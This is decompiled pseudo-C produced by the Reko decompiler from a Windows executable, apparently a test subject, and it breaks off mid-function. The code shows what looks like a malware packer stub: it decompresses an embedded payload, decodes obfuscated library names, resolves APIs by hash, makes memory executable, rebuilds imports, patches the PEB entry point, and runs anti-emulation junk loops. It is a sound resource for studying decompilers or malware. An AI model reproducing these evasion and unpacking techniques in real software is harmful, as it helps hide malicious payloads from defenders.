// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000(Stack word32 dwArg04)
void fn00401000(word32 dwArg04)
{
	__align(fp - 0x04);
	Mem25[dwArg04 + 0x00:byte] = Mem0[0x00405350:byte];
	word32 esi_104 = dwLoc013C;
	word32 ebx_105 = 0x00;
	word32 edx_134 = dwArg04 + 0x01;
	word32 edi_102 = 0x00405351;
	word32 dwLoc0148_100 = 0x00;
	word32 dwLoc0134_275 = 0x00;
	word32 dwLoc0140_101 = dwArg04 + 0x01;
	word32 dwLoc0144_130 = 0x00405351;
l00401040:
	ebx_105 = ebx_105 - 0x01;
	if (ebx_105 == 0x00)
	{
		edi_102 = edi_102 + 0x01;
		esi_104 = (word32) Mem25[edi_102 + 0x00:byte];
		dwLoc0144_130 = edi_102;
		ebx_105 = ebx_105 + 0x07;
	}
	esi_104 = esi_104 * 0x02;
	if ((esi_104 >>u 0x07 & 0x01) == 0x00)
	{
		Mem424[edx_134 + 0x00:byte] = Mem25[edi_102 + 0x00:byte];
		edi_102 = edi_102 + 0x01;
		edx_134 = edx_134 + 0x01;
		dwLoc0144_130 = edi_102;
		goto l004012B0;
	}
	word32 ebx_153 = ebx_105 - 0x01;
	word32 dwLoc0138_157 = ebx_153;
	if (ebx_105 == 0x00)
	{
		edi_102 = edi_102 + 0x01;
		esi_104 = (word32) Mem25[edi_102 + 0x00:byte];
		ebx_153 = 0x07;
		dwLoc0144_130 = edi_102;
		dwLoc0138_157 = 0x07;
	}
	word32 esi_172 = esi_104 * 0x02;
	if ((esi_104 >>u 0x07 & 0x01) != 0x00)
	{
		ebx_105 = ebx_153 - 0x01;
		if (ebx_153 == 0x00)
		{
			esi_172 = (word32) Mem25[edi_102 + 0x00:byte];
			edi_102 = edi_102 + 0x01;
			ebx_105 = ebx_153 + 0x07;
		}
		esi_104 = esi_172 * 0x02;
		if ((esi_172 >>u 0x07 & 0x01) == 0x00)
		{
			word32 ecx_263 = (word32) Mem25[edi_102 + 0x00:byte];
			edi_102 = edi_102 + 0x01;
			word32 eax_267 = (ecx_263 & 0x01) + 0x02;
			dwLoc0144_130 = edi_102;
			if (ecx_263 >>u 0x01 != 0x00)
			{
				if (eax_267 != 0x00)
				{
					do
					{
						edx_134 = edx_134 + 0x01;
						Mem295[edx_134 - 0x01 + 0x00:byte] = Mem25[edx_134 - (ecx_263 >>u 0x01) + 0x00:byte];
						eax_267 = eax_267 - 0x01;
					} while (eax_267 != 0x00);
					dwLoc0140_101 = edx_134;
					dwLoc0130 = ecx_263 >>u 0x01;
					dwLoc0148_100 = 0x01;
l004012B4:
					if (dwLoc0134_275 == 0x00)
						goto l00401040;
					return;
				}
			}
			else
				dwLoc0134_275 = 0x01;
			dwLoc0130 = ecx_263 >>u 0x01;
			dwLoc0148_100 = 0x01;
			goto l004012B4;
		}
		word32 ecx_201 = 0x00;
		word32 dwLoc0148_205 = 0x04;
		do
		{
			ebx_105 = ebx_105 - 0x01;
			if (ebx_105 == 0x00)
			{
				esi_104 = (word32) Mem25[edi_102 + 0x00:byte];
				edi_102 = edi_102 + 0x01;
				ebx_105 = ebx_105 + 0x07;
			}
			word32 v26_236 = dwLoc0148_205 - 0x01;
			esi_104 = esi_104 * 0x02;
			dwLoc0148_205 = v26_236;
			ecx_201 = (esi_104 >>u 0x07 & 0x01) + ecx_201 * 0x02;
		} while (v26_236 != 0x00);
		dwLoc0144_130 = edi_102;
		if (ecx_201 != 0x00)
		{
			Mem251[edx_134 + 0x00:byte] = Mem25[edx_134 - ecx_201 + 0x00:byte];
			edx_134 = edx_134 + 0x01;
		}
		else
		{
			Mem255[edx_134 + 0x00:byte] = 0x00;
			edx_134 = edx_134 + 0x01;
		}
l004012B0:
		dwLoc0148_100 = 0x00;
		dwLoc0140_101 = edx_134;
		goto l004012B4;
	}
	word32 eax_332;
	word32 eax_307 = fn00401AC0(ebx_153, fp - 0x0144);
	if (dwLoc0148_100 == 0x00)
	{
		if (eax_307 == 0x02)
		{
			word32 eax_393 = fn00401AC0(ebx_153, fp - 0x0144);
			edx_134 = dwLoc0140_101;
			if (eax_393 != 0x00)
			{
				do
				{
					edx_134 = edx_134 + 0x01;
					Mem409[edx_134 - 0x01 + 0x00:byte] = Mem25[edx_134 - dwLoc0130 + 0x00:byte];
					eax_393 = eax_393 - 0x01;
				} while (eax_393 != 0x00);
				dwLoc0140_101 = edx_134;
			}
			goto l00401280;
		}
		eax_332 = eax_307 - 0x03;
	}
	else
		eax_332 = eax_307 - 0x02;
	word32 eax_336 = (eax_332 << 0x08) + (word32) Mem25[dwLoc0144_130 + 0x00:byte];
	dwLoc0144_130 = dwLoc0144_130 + 0x01;
	word32 eax_342 = fn00401AC0(ebx_153, fp - 0x0144);
	if (eax_336 >=u 0x7D00)
		eax_342 = eax_342 + 0x01;
	if (eax_336 >=u 0x0500)
		eax_342 = eax_342 + 0x01;
	if (eax_336 <u 0x80)
		eax_342 = eax_342 + 0x02;
	edx_134 = dwLoc0140_101;
	if (eax_342 != 0x00)
	{
		do
		{
			Mem375[edx_134 + 0x00:byte] = Mem25[edx_134 - eax_336 + 0x00:byte];
			edx_134 = edx_134 + 0x01;
			eax_342 = eax_342 - 0x01;
		} while (eax_342 != 0x00);
		dwLoc0140_101 = edx_134;
	}
	dwLoc0130 = eax_336;
l00401280:
	ebx_105 = dwLoc0138_157;
	esi_104 = esi_172;
	edi_102 = dwLoc0144_130;
	dwLoc0148_100 = 0x01;
	goto l004012B4;
}

// 00401380: Register word32 fn00401380(Register word32 ecx, Register word32 ebx, Register word32 ebp, Register word32 edi, Register out ptr32 ecxOut, Register out ptr32 ebxOut, Register out ptr32 ebpOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00401380(word32 ecx, word32 ebx, word32 ebp, word32 edi, ptr32 & ecxOut, ptr32 & ebxOut, ptr32 & ebpOut, ptr32 & esiOut, ptr32 & ediOut)
{
	word32 ebp_337 = fp - 0x04;
	word32 edx_21 = 0x15;
	do
		edx_21 = edx_21 - 0x01;
	while (edx_21 != 0x00);
	CharNextA(fp - 0x05);
	fn004018B0(fp - 0x14, 0x0A, 0x00409780);
	word32 edi_341 = LoadLibraryA(fp - 0x14);
	word32 esp_336 = fp - 0xB4;
	word32 eax_62 = GetCurrentThread();
	if (eax_62 == 0x00)
	{
		byte SCZO_338;
		word32 ebx_339;
		word32 esi_340;
		word32 ecx_342;
		word32 eax_343;
		word32 edx_344;
		byte SZO_345;
		byte C_346;
		byte Z_347;
		byte bl_348;
		byte SO_349;
		byte dl_350;
		0x00409780();
	}
	word32 esi_79 = 0x00;
	if (false)
		fn004017A0();
	do
		esi_79 = esi_79 + 0x01;
	while (esi_79 < 0x03);
	word32 esp_86 = esp_336 - 0x04;
	Mem87[esp_86 + 0x00:word32] = 0x021C0C0C;
	word32 ecx_91;
	word32 edx_92;
	word32 ebp_93;
	word32 esi_94;
	word32 edi_95;
	word32 eax_96 = fn00401C20(edi_341, ebp_337, esi_79, edi_341, ebp, dwArg00, out ecx_91, out edx_92, out ebp_93, out esi_94, out edi_95);
	word32 esp_100 = esp_86 + 0x04;
	do
	{
		word32 esp_101 = esp_100 - 0x04;
		Mem102[esp_101 + 0x00:word32] = 0x00;
		Mem104[esp_101 - 0x04 + 0x00:word32] = 0x00;
		Mem106[esp_101 - 0x08 + 0x00:word32] = 0x00;
		word32 ebp_108;
		byte SCZO_109;
		word32 ebx_110;
		word32 esi_111;
		word32 edi_112;
		word32 ecx_113;
		word32 eax_114;
		word32 edx_115;
		byte SZO_116;
		byte C_117;
		byte Z_118;
		byte bl_119;
		byte SO_120;
		byte dl_121;
		eax_96();
	} while (eax_114 != 0x00);
	Mem126[esp_100 - 0x04 + 0x00:word32] = ~0x00;
	Mem128[esp_100 - 0x08 + 0x00:word32] = ~0x00;
	Mem130[esp_100 - 0x0C + 0x00:word32] = ~0x00;
	byte SCZO_133;
	word32 ecx_137;
	word32 eax_138;
	word32 edx_139;
	byte SZO_140;
	byte C_141;
	byte Z_142;
	byte bl_143;
	byte SO_144;
	byte dl_145;
	word32 edi_136;
	word32 esi_135;
	word32 ebx_134;
	word32 ebp_132;
	word32 esp_131;
	esi_111();
	if (eax_138 != 0x00EFEF20)
	{
		byte SCZO_323;
		word32 ecx_327;
		word32 eax_328;
		word32 edx_329;
		byte SZO_330;
		byte C_331;
		byte Z_332;
		byte bl_333;
		byte SO_334;
		byte dl_335;
		eax_138();
	}
	GetLastError();
	word32 esp_158 = esp_131 - 0x04;
	Mem159[esp_158 + 0x00:word32] = 3769334729;
	word32 ecx_160;
	word32 edx_161;
	word32 ebp_162;
	word32 esi_163;
	word32 edi_164;
	word32 eax_165 = fn00401C20(ebx_134, ebp_132, esi_135, edi_136, ebp, dwArg00, out ecx_160, out edx_161, out ebp_162, out esi_163, out edi_164);
	Mem168[ebp_162 - 0x68 + 0x00:word32] = Mem159[ebp_162 - 0x68 + 0x00:word32] & eax_165;
	Mem174[esp_158 + 0x00:word32] = 0x00;
	Mem176[esp_158 - 0x04 + 0x00:word32] = 0x08;
	Mem178[esp_158 - 0x08 + 0x00:word32] = 2172712;
	byte SCZO_181;
	word32 ecx_185;
	word32 eax_186;
	word32 edx_187;
	byte SZO_188;
	byte C_189;
	byte Z_190;
	byte bl_191;
	byte SO_192;
	byte dl_193;
	word32 edi_184;
	word32 esi_183;
	word32 ebx_182;
	word32 ebp_180;
	word32 esp_179;
	eax_165();
	if (eax_186 != 0x00222728)
	{
		byte SCZO_308;
		word32 ecx_312;
		word32 eax_313;
		word32 edx_314;
		byte SZO_315;
		byte C_316;
		byte Z_317;
		byte bl_318;
		byte SO_319;
		byte dl_320;
		eax_186();
	}
	word32 esp_201 = esp_179 - 0x04;
	Mem202[esp_201 + 0x00:word32] = 2921600904;
	word32 ecx_203;
	word32 edx_204;
	word32 ebp_205;
	word32 esi_206;
	word32 edi_207;
	word32 eax_208 = fn00401C20(ebx_182, ebp_180, esi_183, edi_184, ebp, dwArg00, out ecx_203, out edx_204, out ebp_205, out esi_206, out edi_207);
	Mem212[esp_201 + 0x00:word32] = 0x20;
	Mem215[esp_201 - 0x04 + 0x00:word32] = ebp_205 - 0x34;
	Mem217[esp_201 - 0x08 + 0x00:word32] = 11;
	byte SCZO_220;
	word32 ebx_221;
	word32 esi_222;
	word32 edi_223;
	word32 ecx_224;
	word32 edx_226;
	byte SZO_227;
	byte C_228;
	byte Z_229;
	byte bl_230;
	byte SO_231;
	byte dl_232;
	word32 eax_225;
	word32 ebp_219;
	word32 esp_218;
	eax_208();
	word32 ecx_233 = ebp_219 - 0x34;
	*ecxOut = ecx_233;
	if (eax_225 != ebp_219 - 0x34)
	{
		byte SCZO_293;
		word32 ebx_294;
		word32 esi_295;
		word32 edi_296;
		word32 ecx_297;
		word32 edx_299;
		byte SZO_300;
		byte C_301;
		byte Z_302;
		byte bl_303;
		byte SO_304;
		byte dl_305;
		eax_225();
	}
	byte dl_248 = Mem217[ebp_219 - 0x34 + 0x00:byte];
	if (dl_248 != Mem217[(ebp_219 - 0x33) + 0x00:byte])
	{
		byte SCZO_278;
		word32 ebx_279;
		word32 esi_280;
		word32 edi_281;
		word32 ecx_282;
		word32 edx_284;
		byte SZO_285;
		byte C_286;
		byte Z_287;
		byte bl_288;
		byte SO_289;
		byte dl_290;
		eax_225();
	}
	word32 esp_263 = esp_218 + 0x04;
	word32 edi_262;
	*ediOut = Mem217[esp_218 + 0x00:word32];
	word32 esi_264;
	*esiOut = Mem217[esp_263 + 0x00:word32];
	word32 ebx_266;
	*ebxOut = Mem217[esp_263 + 0x04:word32];
	word32 ebp_269;
	*ebpOut = Mem217[ebp_219 + 0x00:word32];
	return eax_225;
}

// 004014A0: Register word32 fn004014A0(Register word32 eax, Register word32 ecx, Register word32 ebx, Register word32 ebp, Register word32 edi)
word32 fn004014A0(word32 eax, word32 ecx, word32 ebx, word32 ebp, word32 edi)
{
	word32 esi_14 = Mem0[0x00405344:word32];
	word32 ebp_32 = fp - 0x04;
	word32 esp_15 = fp - 0x0274;
	word32 eax_24 = GetCurrentThread();
	if (eax_24 == 0x00)
	{
		byte SCZO_541;
		word32 esi_543;
		word32 eax_545;
		byte SZO_546;
		byte C_547;
		byte Z_548;
		word32 edx_550;
		byte al_551;
		word16 dx_552;
		byte S_553;
		selector fs_554;
		esi_14();
	}
	word32 ecx_37;
	word32 ebx_38;
	word32 ebp_39;
	word32 esi_40;
	word32 edi_41;
	word32 eax_42 = fn00401380(ecx, ebx, ebp_32, edi, out ecx_37, out ebx_38, out ebp_39, out esi_40, out edi_41);
	Mem45[ebp_39 - 0x0231 + 0x00:word32] = Mem0[ebp_39 - 0x0231 + 0x00:word32] & eax_42;
	Mem48[ebp_39 - 0x0234 + 0x00:word32] = Mem45[ebp_39 - 0x0234 + 0x00:word32] & eax_42;
	word32 eax_50 = Mem48[esi_40 + 0x3C:word32];
	word32 ecx_51 = (word32) Mem48[eax_50 + 22 + esi_40:word16];
	word32 edx_52 = Mem48[eax_50 + 0xC0 + esi_40:word32];
	Mem55[ebp_39 - 0x33 + 0x00:byte] = 0x67;
	Mem56[ebp_39 - 0x30 + 0x00:byte] = 0x67;
	Mem58[ebp_39 - 0x2F + 0x00:byte] = 110;
	Mem59[ebp_39 - 0x2A + 0x00:byte] = 110;
	Mem60[ebp_39 - 0x29 + 0x00:byte] = 110;
	Mem64[ebp_39 - 0x38 + 0x00:word32] = edx_52;
	Mem65[ebp_39 - 0x28 + 0x00:byte] = 0x00;
	Mem66[ebp_39 - 0x18 + 0x00:byte] = 0x00;
	Mem67[ebp_39 - 0x10 + 0x00:word32] = ecx_51;
	Mem72[ebp_39 - 0x34 + 0x00:byte] = 0x6D;
	Mem73[ebp_39 - 0x32 + 0x00:byte] = 116;
	Mem74[ebp_39 - 0x31 + 0x00:byte] = 0x70;
	Mem75[ebp_39 - 0x2E + 0x00:byte] = 0x31;
	Mem76[ebp_39 - 0x2D + 0x00:byte] = 0x30;
	Mem77[ebp_39 - 44 + 0x00:byte] = 44;
	Mem78[ebp_39 - 0x2B + 0x00:byte] = 0x66;
	fn004018B0(ebp_39 - 0x24, 0x18, ebp_39 - 0x34);
	word32 esp_80 = esp_15 - 0x04;
	Mem81[esp_80 + 0x00:word32] = ebp_39 - 0x24;
	word32 eax_82 = LoadLibraryA(Mem81[esp_80 + 0x00:LPCSTR]);
	Mem85[esp_80 + 0x00:word32] = 3321835334;
	word32 ecx_88;
	word32 edx_89;
	word32 ebp_90;
	word32 esi_91;
	word32 edi_92;
	word32 eax_93 = fn00401C20(eax_82, ebp_39, esi_40, edi_41, ebp, dwArg00, out ecx_88, out edx_89, out ebp_90, out esi_91, out edi_92);
	Mem98[esp_80 + 0x00:word32] = ebp_90 - 0x0C;
	Mem100[esp_80 - 0x04 + 0x00:word32] = 0x40;
	Mem102[esp_80 - 0x08 + 0x00:word32] = 0x6200;
	Mem104[esp_80 - 0x0C + 0x00:word32] = esi_91;
	word32 esp_105;
	byte SCZO_107;
	word32 ebx_108;
	word32 esi_109;
	word32 edi_110;
	word32 eax_111;
	byte SZO_112;
	byte C_113;
	byte Z_114;
	word32 ecx_115;
	word32 edx_116;
	byte al_117;
	word16 dx_118;
	byte S_119;
	selector fs_120;
	word32 ebp_106;
	eax_93();
	Mem121[ebp_106 - 0x011D + 0x00:word32] = eax_111;
	Mem124[esp_105 - 0x04 + 0x00:word32] = 0x00;
	word32 edi_122 = GetModuleHandleA;
	word32 eax_125 = GetModuleHandleA(Mem124[esp_105 - 0x04 + 0x00:LPCSTR]);
	word32 esp_126 = esp_105;
	if (eax_125 == 0x00)
	{
		byte SCZO_519;
		word32 ebx_520;
		word32 esi_521;
		word32 eax_523;
		byte SZO_524;
		byte C_525;
		byte Z_526;
		word32 ecx_527;
		word32 edx_528;
		byte al_529;
		word16 dx_530;
		byte S_531;
		selector fs_532;
		ebp_106();
	}
	word32 esi_147 = Mem124[ebp_106 - 0x14 + 0x00:word32];
	word32 esp_148 = esp_126 - 0x04;
	Mem149[esp_148 + 0x00:word32] = esi_147;
	fn00401000(dwArg00);
	word32 eax_152 = esi_147;
	word32 ecx_154 = 0x187F;
	do
	{
		Mem158[eax_152 + 0x00:word32] = Mem149[eax_152 + 0x00:word32] + 0x4DF4;
		eax_152 = eax_152 + 0x04;
		ecx_154 = ecx_154 - 0x01;
	} while (ecx_154 != 0x00);
	Mem165[esp_148 + 0x00:word32] = ecx_154;
	word32 esp_166;
	word32 ebp_167;
	byte SCZO_168;
	word32 ebx_169;
	word32 esi_170;
	word32 edi_171;
	word32 eax_172;
	byte SZO_173;
	byte C_174;
	byte Z_175;
	word32 ecx_176;
	word32 edx_177;
	byte al_178;
	word16 dx_179;
	byte S_180;
	selector fs_181;
	edi_122();
	Mem183[ebp_167 - 0x0196 + 0x00:word32] = Mem165[ebp_167 - 0x0196 + 0x00:word32] - eax_172;
	word16 dx_186 = Mem183[ebp_167 - 0x10 + 0x00:word16];
	word32 edi_187 = Mem183[esi_170 + 0x3C:word32] + esi_170;
	Mem188[edi_187 + 0xC0:word32] = Mem183[ebp_167 - 0x38 + 0x00:word32];
	word32 eax_189 = Mem188[edi_187 + 0xA0:word32];
	Mem194[ebp_167 - 0xA8 + 0x00:word32] = edi_187;
	Mem195[edi_187 + 22:word16] = dx_186;
	if (eax_189 != 0x00)
	{
		word32 esi_440 = eax_189 + Mem195[0x00405344:word32];
		Mem442[ebp_167 - 0x3C + 0x00:word32] = Mem195[ebp_167 - 0x3C + 0x00:word32] & eax_189;
		Mem446[esp_166 - 0x04 + 0x00:word32] = ebp_167 - 0x10;
		Mem447[ebp_167 - 0x10 + 0x00:byte] = 0x00;
		CharNextA(Mem447[esp_166 - 0x04 + 0x00:LPCSTR]);
		word32 edx_452 = Mem447[0x00405344:word32] - Mem447[edi_187 + 0x34:word32];
		word32 ecx_455 = 0x0162;
		word32 ebx_456 = 0x0A;
		do
		{
			ecx_455 = ecx_455 - 0x03;
			Mem465[ebp_167 - 0x14 + 0x00:word32] = ecx_455;
			if (ecx_455 != 0x00)
			{
				Mem516[ebp_167 - 0x14 + 0x00:word32] = 0x03;
				ecx_455 = 0x03;
			}
			ebx_456 = ebx_456 - 0x01;
		} while (ebx_456 != 0x00);
		if (Mem465[esi_440 + 0x00:word32] != ebx_456)
		{
			do
			{
				word32 eax_479 = Mem465[esi_440 + 0x04:word32];
				word32 ecx_485 = esi_440 + 0x08;
				if (eax_479 - 0x08 >>u 0x01 > 0x00)
				{
					Mem493[ebp_167 - 0x14 + 0x00:word32] = eax_479 - 0x08 >>u 0x01;
					do
					{
						word32 eax_495 = (word32) Mem493[ecx_485 + 0x00:word16];
						if ((eax_495 & 0xF000) == 0x3000)
						{
							word32 eax_511 = (eax_495 & 0x0FFF) + Mem493[esi_440 + 0x00:word32] + Mem493[0x00405344:word32];
							Mem513[eax_511 + 0x00:word32] = Mem493[eax_511 + 0x00:word32] + edx_452;
						}
						word32 v26_504 = Mem493[ebp_167 - 0x14 + 0x00:word32] - 0x01;
						Mem505[ebp_167 - 0x14 + 0x00:word32] = v26_504;
						ecx_485 = ecx_485 + 0x02;
					} while (v26_504 != 0x00);
				}
				esi_440 = esi_440 + Mem465[esi_440 + 0x04:word32];
			} while (Mem465[esi_440 + 0x00:word32] != 0x00);
		}
	}
	word32 edi_203 = edi_187;
	if (Mem195[edi_187 + 0x80:word32] != 0x00)
	{
		Mem290[esp_166 - 0x04 + 0x00:word32] = 0x00;
		CloseHandle(Mem290[esp_166 - 0x04 + 0x00:HANDLE]);
		word32 ebx_294 = Mem290[edi_187 + 0x80:word32] + Mem290[0x00405344:word32];
		Mem297[ebp_167 - 0x10 + 0x00:word32] = ebx_294;
		Mem299[esp_166 - 0x04 + 0x00:word32] = 0x00;
		CloseHandle(Mem299[esp_166 - 0x04 + 0x00:HANDLE]);
		word32 ebx_303 = Mem299[edi_187 + 0x80:word32] + Mem299[0x00405344:word32];
		Mem306[ebp_167 - 0x10 + 0x00:word32] = ebx_303;
		if (Mem299[ebx_303 + 0x10:word32] != 0x00)
		{
			do
			{
				Mem319[esp_166 - 0x04 + 0x00:word32] = Mem306[ebx_303 + 0x0C:word32] + Mem306[0x00405344:word32];
				Mem328[esp_166 - 0x04 + 0x00:word32] = Mem319[ebx_303 + 0x0C:word32] + Mem319[0x00405344:word32];
				word32 eax_329 = LoadLibraryA(Mem328[esp_166 - 0x04 + 0x00:LPCSTR]);
				if (eax_329 != 0x00)
				{
					word32 ebx_369;
					Mem354[ebp_167 - 0x3C + 0x00:word32] = Mem328[ebp_167 - 0x3C + 0x00:word32] ^ Mem328[(ebp_167 - 0x3C) + 0x00:word32];
					Mem362[ebp_167 - 0x3C + 0x00:word32] = Mem354[ebp_167 - 0x3C + 0x00:word32] ^ Mem354[(ebp_167 - 0x3C) + 0x00:word32];
					word32 eax_364 = Mem362[ebx_303 + 0x00:word32];
					if (eax_364 != 0x00)
						ebx_369 = eax_364;
					else
						ebx_369 = Mem362[ebx_303 + 0x10:word32];
					word32 eax_370 = Mem362[0x00405344:word32];
					word32 ebx_373 = ebx_369 + eax_370;
					word32 eax_375 = Mem362[ebx_373 + 0x00:word32];
					word32 esi_374 = Mem362[Mem362[ebp_167 - 0x10 + 0x00:word32] + 0x10:word32] + eax_370;
					byte S_379 = cond(eax_375);
					if (eax_375 != 0x00)
					{
						do
						{
							word32 edx_410;
							if (!S_379)
							{
								Mem429[ebp_167 - 0x025C + 0x00:word32] = Mem362[ebp_167 - 0x025C + 0x00:word32] & eax_375;
								edx_410 = (word32) Mem429[ebx_373 + 0x00:word16];
							}
							else
								edx_410 = eax_375 + 0x02 + Mem362[0x00405344:word32];
							Mem413[esp_166 - 0x04 + 0x00:word32] = edx_410;
							Mem415[esp_166 - 0x08 + 0x00:word32] = eax_329;
							Mem419[esi_374 + 0x00:word32] = GetProcAddress(Mem415[esp_166 - 0x08 + 0x00:HMODULE], Mem415[esp_166 - 0x04 + 0x00:LPCSTR]);
							ebx_373 = ebx_373 + 0x04;
							eax_375 = Mem419[ebx_373 + 0x00:word32];
							esi_374 = esi_374 + 0x04;
							S_379 = cond(eax_375);
						} while (eax_375 != 0x00);
					}
					ebx_303 = Mem362[ebp_167 - 0x10 + 0x00:word32];
				}
				ebx_303 = ebx_303 + 0x14;
				Mem349[ebp_167 - 0x10 + 0x00:word32] = ebx_303;
			} while (Mem328[ebx_303 + 0x10:word32] != 0x00);
			edi_203 = Mem349[ebp_167 - 0xA8 + 0x00:word32];
		}
	}
	word32 eax_221 = Mem195[edi_203 + 0x28:word32] + Mem195[0x00405344:word32];
	Mem223[ebp_167 - 0x08 + 0x00:word32] = 0x00;
	Mem224[0x0040534C:word32] = eax_221;
	Mem226[esp_166 - 0x04 + 0x00:word32] = eax_221;
	Mem228[ebp_167 - 0x08 + 0x00:word32] = Mem226[fs_181:0x30:word32];
	word32 edi_233 = Mem228[Mem228[Mem228[ebp_167 - 0x08 + 0x00:word32] + 0x0C:word32] + 0x0C:word32];
	word32 eax_234 = Mem228[0x00405344:word32];
	do
		edi_233 = Mem228[edi_233 + 0x00:word32];
	while (Mem228[edi_233 + 0x18:word32] != eax_234);
	Mem243[esp_166 - 0x04 + 0x00:word32] = ebp_167 - 0x04;
	Mem244[ebp_167 - 0x04 + 0x00:byte] = 0x00;
	word32 eax_245 = CharNextA(Mem244[esp_166 - 0x04 + 0x00:LPCSTR]);
	Mem249[ebp_167 - 0x5F + 0x00:word32] = Mem244[ebp_167 - 0x5F + 0x00:word32] & eax_245;
	Mem252[ebp_167 - 0x5D + 0x00:word32] = Mem249[ebp_167 - 0x5D + 0x00:word32] | eax_245;
	Mem258[edi_233 + 0x1C:word32] = Mem252[0x0040534C:word32];
	word32 ecx_259 = 0x03B3;
	word32 edx_260 = 0x0A;
	do
	{
		ecx_259 = ecx_259 + 0x02;
		Mem271[ebp_167 - 0x14 + 0x00:word32] = ecx_259;
		if (ecx_259 == 0x00)
		{
			Mem288[ebp_167 - 0x14 + 0x00:word32] = 0x01;
			ecx_259 = 0x01;
		}
		edx_260 = edx_260 - 0x01;
	} while (edx_260 != 0x00);
	return ecx_259;
}

// 004017A0: void fn004017A0()
void fn004017A0()
{
	if (GetMessageA(fp - 0x1C, 0x00, 0x00, 0x00) != 0x00)
	{
		do
		{
			TranslateMessage(fp - 0x1C);
			DispatchMessageA(fp - 0x1C);
		} while (GetMessageA(fp - 0x1C, 0x00, 0x00, 0x00) != 0x00);
	}
	return;
}

// 00401800: Register DWORD Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 ebp_108 = fp - 0x04;
	word32 eax_11 = 0x035E;
	word32 edx_12 = 0x31;
	do
	{
		eax_11 = eax_11 - 0x0A;
		word32 dwLoc08_119 = eax_11;
		if (eax_11 == 0x00)
		{
			eax_11 = 0x08;
			dwLoc08_119 = 0x08;
		}
		word32 ecx_109 = dwLoc08_119;
		edx_12 = edx_12 - 0x01;
	} while (edx_12 != 0x00);
	word32 eax_110 = RegQueryValueA(edx_12, edx_12, edx_12, edx_12);
	word32 esp_107 = fp - 0x0C;
	if (eax_110 != 0x06)
	{
		word32 edx_111;
		byte SCZO_112;
		byte Z_113;
		byte SZO_114;
		byte C_115;
		(fp - 0x04)();
	}
	word32 ecx_48;
	word32 ebx_49;
	word32 edi_50;
	word32 eax_51 = fn00401920(eax_110, ecx_109, ebx, edi, out ecx_48, out ebx_49, out edi_50);
	if (eax_51 != 0x00)
	{
		word32 esp_84 = esp_107 - 0x04;
		Mem85[esp_84 + 0x00:word32] = 66;
		word32 eax_86 = DPB(eax_51, GetKeyState(Mem85[esp_84 + 0x00:int32]), 0);
		word32 ecx_103 = 0x033B;
		word32 edx_89 = 0x06;
		do
		{
			ecx_103 = ecx_103 >>u 0x08;
			Mem96[ebp_108 - 0x04 + 0x00:word32] = ecx_103;
			if (ecx_103 == 0x00)
			{
				Mem104[ebp_108 - 0x04 + 0x00:word32] = 0x08;
				ecx_103 = 0x08;
			}
			eax_86 = eax_86 ^ Mem96[(ebp_108 - 0x04) + 0x00:word32];
			edx_89 = edx_89 - 0x01;
		} while (edx_89 != 0x00);
		fn004014A0(eax_86, ecx_103, ebx_49, ebp_108, edi_50);
	}
	word32 eax_59 = 0x02D6;
	word32 edx_60 = 0x4C;
	do
	{
		eax_59 = eax_59 - 0x07;
		Mem67[ebp_108 - 0x04 + 0x00:word32] = eax_59;
		if (eax_59 == 0x00)
		{
			Mem83[ebp_108 - 0x04 + 0x00:word32] = 0x09;
			eax_59 = 0x09;
		}
		edx_60 = edx_60 - 0x01;
	} while (edx_60 != 0x00);
	word32 eax_79 = Mem67[0x0040534C:word32];
	Mem81[ebp_108 + 0x00:word32] = eax_79;
	return eax_79;
}

// 004018B0: void fn004018B0(Register word32 eax, Register word32 ecx, Register word32 edx)
void fn004018B0(word32 eax, word32 ecx, word32 edx)
{
	word32 esi_58 = edx;
	word32 edi_11 = eax;
	byte al_13 = Mem0[edx + 0x00:byte];
	if (al_13 != 0x00)
	{
		byte cl_48 = (byte) ecx;
		do
		{
			byte al_111;
			if (al_13 <=u 0x5A)
				al_111 = (byte) (int32) ((int64) ((int32) al_13 - 0x41 + ecx) % 0x1A) + 0x41;
			else if (al_13 <=u 122)
				al_111 = (byte) (int32) ((int64) ((int32) al_13 - 0x61 + ecx) % 0x1A) + 0x61;
			else
				al_111 = al_13 ^ 0x1A - cl_48;
			Mem73[edi_11 + 0x00:byte] = al_111;
			esi_58 = esi_58 + 0x01;
			al_13 = Mem73[esi_58 + 0x00:byte];
			edi_11 = edi_11 + 0x01;
		} while (al_13 != 0x00);
	}
	return;
}

// 00401920: Register word32 fn00401920(Register word32 eax, Register word32 ecx, Register word32 ebx, Register word32 edi, Register out ptr32 ecxOut, Register out ptr32 ebxOut, Register out ptr32 ediOut)
word32 fn00401920(word32 eax, word32 ecx, word32 ebx, word32 edi, ptr32 & ecxOut, ptr32 & ebxOut, ptr32 & ediOut)
{
	*ecxOut = ecx;
	word32 ebp_275 = fp - 0x04;
	word32 edi_21 = edi - dwLoc0138;
	word32 eax_30 = RegQueryValueA(0x00, 0x00, 0x00, 0x00);
	word32 esp_274 = fp - 0x0160;
	if (eax_30 != 0x06)
	{
		byte SCZO_276;
		word32 esi_278;
		word32 eax_280;
		byte SZO_281;
		byte C_282;
		byte Z_283;
		byte CZ_285;
		byte dl_286;
		word32 edx_287;
		ecx();
	}
	if (Mem0[0x00405340:word32] == 0x00)
	{
		word32 eax_118;
		Mem81[0x00405340:word32] = 0x01;
		word32 esp_83 = esp_274 - 0x04;
		Mem84[esp_83 + 0x00:word32] = 0x00401920;
		word32 ecx_85;
		word32 ebx_86;
		word32 esi_88;
		word32 edi_89;
		word32 ebp_166;
		fn00401380(ecx, ebx, ebp_275, edi_21, out ecx_85, out ebx_86, out ebp_166, out esi_88, out edi_89);
		Mem93[0x00405344:word32] = Mem84[esp_83 + 0x00:word32];
		Mem94[0x00405344:word16] = 0x00;
		word32 ecx_95 = Mem94[0x00405344:word32];
		word32 eax_96 = Mem94[ecx_95 + 0x3C:word32];
		word32 esi_267 = Mem94[eax_96 + 0x50 + ecx_95:word32];
		Mem99[esp_83 + 0x00:word32] = 0x40;
		Mem102[esp_83 - 0x04 + 0x00:word32] = 0x1000;
		Mem104[esp_83 - 0x08 + 0x00:word32] = esi_267;
		Mem106[esp_83 - 0x0C + 0x00:word32] = 0x00;
		Mem107[ebp_166 - 0x08 + 0x00:word32] = eax_96 + ecx_95;
